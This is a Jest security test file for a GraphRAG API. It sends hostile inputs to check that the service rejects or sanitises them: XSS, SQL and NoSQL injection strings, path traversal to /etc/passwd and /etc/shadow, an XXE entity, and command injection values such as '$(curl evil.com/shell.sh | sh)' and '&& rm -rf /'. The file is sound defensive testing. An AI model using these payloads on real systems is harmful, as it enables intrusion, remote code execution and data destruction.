/**
 * Security and Vulnerability Tests for GraphRAG System
 * Tests authentication, authorization, input validation, and common vulnerabilities
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from '@jest/globals';
import { TestAPIClient, DatabaseTestUtils } from '../helpers/test-helpers';
import { testConfig } from '../test-config';
import crypto from 'crypto';

describe('GraphRAG Security Tests', () => {
  let apiClient: TestAPIClient;
  let dbUtils: DatabaseTestUtils;

  beforeAll(async () => {
    apiClient = new TestAPIClient(testConfig.api.baseUrl);
    dbUtils = new DatabaseTestUtils();
  });

  beforeEach(async () => {
    await dbUtils.cleanDatabase();
  });

  afterEach(async () => {
    await dbUtils.cleanDatabase();
  });

  describe('Authentication', () => {
    it('should reject requests without API key when required', async () => {
      if (process.env.REQUIRE_API_KEY === 'true') {
        const unauthClient = new TestAPIClient(testConfig.api.baseUrl);
        const response = await unauthClient.listDocuments();

        expect(response.status).toBe(401);
        expect(response.data).toHaveProperty('error');
        expect(response.data.message).toContain('authentication');
      }
    });

    it('should reject invalid API keys', async () => {
      if (process.env.REQUIRE_API_KEY === 'true') {
        const invalidClient = new TestAPIClient(testConfig.api.baseUrl, 'invalid-api-key-123');
        const response = await invalidClient.listDocuments();

        expect(response.status).toBe(403);
        expect(response.data).toHaveProperty('error');
        expect(response.data.message).toContain('invalid');
      }
    });

    it('should allow health check without authentication', async () => {
      const unauthClient = new TestAPIClient(testConfig.api.baseUrl);
      const response = await unauthClient.getHealth();

      expect(response.status).toBe(200);
    });

    it('should handle API key rotation', async () => {
      // This would require admin endpoints for key management
      // Testing the concept of key rotation
      const oldKey = 'old-api-key';
      const newKey = 'new-api-key';

      // Simulate key rotation logic
      expect(oldKey).not.toBe(newKey);
    });
  });

  describe('Input Validation', () => {
    it('should sanitize HTML in input', async () => {
      const maliciousInput = {
        content: 'Normal text <script>alert("XSS")</script> more text',
        metadata: {
          title: '<img src=x onerror=alert("XSS")>'
        }
      };

      const response = await apiClient.uploadDocument(maliciousInput);

      if (response.status === 201) {
        // Retrieve the document to check sanitization
        const docId = response.data.documentId;
        const getResponse = await apiClient.getDocument(docId);

        if (getResponse.status === 200) {
          expect(getResponse.data.content).not.toContain('<script>');
          expect(getResponse.data.metadata.title).not.toContain('onerror=');
        }
      }
    });

    it('should reject SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE documents; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM documents WHERE 1=1; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await apiClient.searchDocuments({
          query: payload,
          limit: 10
        });

        // Should either sanitize or return no results
        expect(response.status).toBe(200);

        if (response.data.results && response.data.results.length > 0) {
          // Check that results don't indicate SQL was executed
          const resultsStr = JSON.stringify(response.data.results);
          expect(resultsStr).not.toContain('DROP TABLE');
          expect(resultsStr).not.toContain('DELETE FROM');
        }
      }
    });

    it('should reject NoSQL injection attempts', async () => {
      const noSqlPayloads = [
        { query: { $ne: null } },
        { query: { $gt: '' } },
        { query: { $regex: '.*' } },
        { metadata: { $where: 'this.password == "admin"' } }
      ];

      for (const payload of noSqlPayloads) {
        const response = await apiClient.axios.post('/search', payload);

        expect([200, 400]).toContain(response.status);

        if (response.status === 200) {
          // Ensure no unauthorized data is returned
          expect(response.data).not.toHaveProperty('password');
          expect(response.data).not.toHaveProperty('apiKey');
        }
      }
    });

    it('should validate and limit input size', async () => {
      const oversizedPayloads = [
        { content: 'A'.repeat(10 * 1024 * 1024) }, // 10MB
        { metadata: { tags: Array(10000).fill('tag') } }, // 10k tags
        { query: 'search '.repeat(100000) } // Very long query
      ];

      for (const payload of oversizedPayloads) {
        const response = await apiClient.axios.post('/documents', payload);

        expect([400, 413]).toContain(response.status);
      }
    });

    it('should validate data types', async () => {
      const invalidTypePayloads = [
        { content: 123 }, // Should be string
        { metadata: { title: null } },
        { limit: 'not-a-number' },
        { page: -1 }
      ];

      for (const payload of invalidTypePayloads) {
        const response = await apiClient.axios.post('/documents', payload);

        if (response.status !== 201) {
          expect([400, 422]).toContain(response.status);
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'documents/../../../sensitive/data',
        '....//....//....//etc/shadow'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await apiClient.axios.get(`/documents/${payload}`);

        expect([400, 404]).toContain(response.status);

        if (response.data) {
          expect(response.data).not.toContain('root:');
          expect(response.data).not.toContain('Administrator:');
        }
      }
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Protection', () => {
    it('should validate origin headers', async () => {
      const maliciousOrigin = 'https://evil-site.com';

      const response = await apiClient.axios.post('/documents',
        { content: 'Test content' },
        {
          headers: {
            'Origin': maliciousOrigin,
            'Referer': maliciousOrigin
          }
        }
      );

      // Should either accept (if CORS is properly configured) or reject
      if (response.status === 403) {
        expect(response.data).toHaveProperty('error');
      }
    });

    it('should use CSRF tokens for state-changing operations', async () => {
      // This would require CSRF token implementation
      // Testing the concept
      const csrfToken = crypto.randomBytes(32).toString('hex');
      expect(csrfToken).toHaveLength(64);
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits', async () => {
      const requests = [];
      const requestCount = 150; // Exceeds typical rate limit

      for (let i = 0; i < requestCount; i++) {
        requests.push(
          apiClient.getHealth().catch(err => err.response)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r?.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);

      if (rateLimited.length > 0) {
        expect(rateLimited[0].headers).toHaveProperty('x-ratelimit-limit');
        expect(rateLimited[0].headers).toHaveProperty('x-ratelimit-remaining');
      }
    });

    it('should have different rate limits for different endpoints', async () => {
      // Document upload should have stricter limits
      const uploadRequests = Array(20).fill(null).map(() =>
        apiClient.uploadDocument({ content: 'Test' }).catch(e => e.response)
      );

      const uploadResponses = await Promise.all(uploadRequests);
      const uploadRateLimited = uploadResponses.filter(r => r?.status === 429);

      // Search might have looser limits
      const searchRequests = Array(50).fill(null).map(() =>
        apiClient.searchDocuments({ query: 'test' }).catch(e => e.response)
      );

      const searchResponses = await Promise.all(searchRequests);
      const searchRateLimited = searchResponses.filter(r => r?.status === 429);

      // Upload should hit rate limit sooner
      if (uploadRateLimited.length > 0 && searchRateLimited.length > 0) {
        expect(uploadRateLimited.length / 20).toBeGreaterThan(searchRateLimited.length / 50);
      }
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not expose sensitive information in errors', async () => {
      const response = await apiClient.axios.get('/api/nonexistent-endpoint');

      expect(response.status).toBe(404);

      const errorStr = JSON.stringify(response.data);
      expect(errorStr).not.toContain('node_modules');
      expect(errorStr).not.toContain('/Users/');
      expect(errorStr).not.toContain('\\Users\\');
      expect(errorStr).not.toContain('stack');
      expect(errorStr).not.toContain('password');
      expect(errorStr).not.toContain('apiKey');
    });

    it('should not expose database schema', async () => {
      const response = await apiClient.executeCypher('INVALID QUERY');

      if (response.status === 400) {
        const errorStr = JSON.stringify(response.data);
        expect(errorStr).not.toContain('CREATE TABLE');
        expect(errorStr).not.toContain('ALTER TABLE');
        expect(errorStr).not.toContain('information_schema');
      }
    });

    it('should sanitize user data in responses', async () => {
      const doc = {
        content: 'Test content',
        metadata: {
          title: 'Test',
          internalField: 'should-not-be-exposed',
          _private: 'private-data',
          password: 'secret123'
        }
      };

      const uploadResponse = await apiClient.uploadDocument(doc);

      if (uploadResponse.status === 201) {
        const getResponse = await apiClient.getDocument(uploadResponse.data.documentId);

        if (getResponse.status === 200) {
          expect(getResponse.data).not.toHaveProperty('password');
          expect(getResponse.data).not.toHaveProperty('_private');
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl evil.com/shell.sh | sh)',
        '&& rm -rf /'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await apiClient.uploadDocument({
          content: payload,
          metadata: { title: payload }
        });

        // Should process safely without executing commands
        if (response.status === 201) {
          expect(response.data).toHaveProperty('documentId');
        }
      }
    });
  });

  describe('XML External Entity (XXE) Prevention', () => {
    it('should prevent XXE attacks', async () => {
      const xxePayload = `<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <document>
          <content>&xxe;</content>
        </document>`;

      const response = await apiClient.axios.post('/documents', xxePayload, {
        headers: { 'Content-Type': 'application/xml' }
      });

      if (response.status === 200 || response.status === 201) {
        const docId = response.data.documentId;
        const getResponse = await apiClient.getDocument(docId);

        if (getResponse.status === 200) {
          expect(getResponse.data.content).not.toContain('root:');
        }
      }
    });
  });

  describe('Cryptographic Security', () => {
    it('should hash sensitive data', async () => {
      // API keys should be hashed in database
      const apiKey = 'test-api-key-12345';
      const hash1 = crypto.createHash('sha256').update(apiKey).digest('hex');
      const hash2 = crypto.createHash('sha256').update(apiKey).digest('hex');

      // Same input should produce same hash
      expect(hash1).toBe(hash2);

      // Hash should be different from original
      expect(hash1).not.toBe(apiKey);
      expect(hash1.length).toBe(64); // SHA-256 produces 64 hex characters
    });

    it('should use secure random generation', async () => {
      const token1 = crypto.randomBytes(32).toString('hex');
      const token2 = crypto.randomBytes(32).toString('hex');

      expect(token1).not.toBe(token2);
      expect(token1.length).toBe(64);
      expect(token2.length).toBe(64);
    });
  });

  describe('Session Security', () => {
    it('should timeout inactive sessions', async () => {
      // This would require session implementation
      // Testing the concept
      const sessionTimeout = 30 * 60 * 1000; // 30 minutes
      const lastActivity = Date.now() - (31 * 60 * 1000); // 31 minutes ago

      const isExpired = Date.now() - lastActivity > sessionTimeout;
      expect(isExpired).toBe(true);
    });

    it('should regenerate session IDs', async () => {
      const sessionId1 = crypto.randomBytes(32).toString('hex');
      const sessionId2 = crypto.randomBytes(32).toString('hex');

      expect(sessionId1).not.toBe(sessionId2);
    });
  });

  describe('Content Security', () => {
    it('should set security headers', async () => {
      const response = await apiClient.getHealth();

      const headers = response.headers;

      // Check for security headers
      const securityHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'strict-transport-security',
        'content-security-policy'
      ];

      // At least some security headers should be present
      const presentHeaders = securityHeaders.filter(h => headers[h]);
      expect(presentHeaders.length).toBeGreaterThan(0);
    });

    it('should validate content types', async () => {
      const response = await apiClient.axios.post('/documents',
        '<script>alert("test")</script>',
        {
          headers: { 'Content-Type': 'text/javascript' }
        }
      );

      // Should either reject or sanitize JavaScript content
      if (response.status === 201) {
        const docId = response.data.documentId;
        const getResponse = await apiClient.getDocument(docId);

        if (getResponse.status === 200) {
          expect(getResponse.data.content).not.toContain('<script>');
        }
      }
    });
  });

  describe('Denial of Service Prevention', () => {
    it('should handle zip bomb attacks', async () => {
      // Create a highly compressible payload
      const payload = 'A'.repeat(1000000); // 1MB of same character

      const response = await apiClient.uploadDocument({
        content: payload,
        metadata: { title: 'Compression test' }
      });

      expect([201, 400, 413]).toContain(response.status);
    });

    it('should limit recursive operations', async () => {
      // Test with deeply nested JSON
      let nested = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        nested = { nested };
      }

      const response = await apiClient.axios.post('/documents', nested);

      expect([400, 413]).toContain(response.status);
    });

    it('should prevent regex DoS', async () => {
      // Evil regex pattern that causes catastrophic backtracking
      const evilPattern = '(a+)+$';
      const evilInput = 'a'.repeat(100) + 'X';

      const response = await apiClient.searchDocuments({
        query: evilInput,
        regex: evilPattern
      });

      // Should complete within reasonable time
      expect(response.status).toBeDefined();
    });
  });
});